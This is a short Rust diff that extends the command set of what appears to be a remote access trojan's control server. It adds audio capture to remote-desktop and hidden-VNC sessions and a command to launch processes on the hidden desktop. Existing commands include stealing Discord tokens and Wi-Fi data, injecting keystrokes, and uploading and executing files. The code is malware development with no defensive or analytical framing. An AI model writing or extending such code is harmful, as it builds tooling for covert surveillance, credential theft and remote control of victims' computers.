@@ -38,6 +38,8 @@ pub enum ServerCommand {
 
     StartRemoteDesktop(SocketAddr, RemoteDesktopConfig),
     StopRemoteDesktop(SocketAddr),
+    StartRemoteDesktopAudio(SocketAddr),
+    StopRemoteDesktopAudio(SocketAddr),
     RequestMicDevices(SocketAddr),
     RequestDiscordTokens(SocketAddr),
     GetWifiData(SocketAddr),
@@ -67,6 +69,7 @@ pub enum ServerCommand {
     MouseClick(SocketAddr, MouseClickData),
     KeyboardInput(SocketAddr, KeyboardInputData),
     RemoteDesktopFrame(SocketAddr, RemoteDesktopFrame),
+    RemoteDesktopAudioChunk(SocketAddr, RemoteDesktopAudioChunk),
 
     GetClients(OSender<Vec<ClientInfo>>),
     GetClient(SocketAddr, OSender<Option<ClientInfo>>),
@@ -117,8 +120,12 @@ pub enum ServerCommand {
 
     StartHVNC(SocketAddr),
     StopHVNC(SocketAddr),
+    StartHVNCFrameAudio(SocketAddr),
+    StopHVNCFrameAudio(SocketAddr),
     OpenExplorer(SocketAddr),
+    OpenHVNCProcess(SocketAddr, String),
     HVNCFrame(SocketAddr, Vec<u8>),
+    HVNCFrameAudioChunk(SocketAddr, HVNCFrameAudioChunk),
 
     UploadAndExecute(SocketAddr, FileData),
     ExecuteFile(SocketAddr, String),
